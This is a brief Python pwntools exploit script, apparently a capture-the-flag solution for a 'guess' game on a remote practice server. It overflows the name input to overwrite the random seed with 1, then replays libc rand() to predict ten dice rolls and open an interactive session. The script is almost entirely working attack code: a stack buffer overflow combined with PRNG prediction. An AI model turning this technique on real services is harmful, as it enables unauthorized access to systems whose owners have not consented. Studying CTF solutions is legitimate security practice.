from pwn import *
#in order to ues c function
from ctypes import *
#p=process('./guess')
p=remote('111.198.29.45',45692)
#gdb.attach(p)
#import c libc
libc=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
p.recvuntil("Your name:")
#rewrite the seed
payload='a'*0x20+p64(1)
p.sendline(payload)
libc.srand(1)

#the game will paly 10 times
for i in range(10):
    num=str(libc.rand()%6+1)
    p.recvuntil("number:")
    p.sendline(num)
p.interactive()
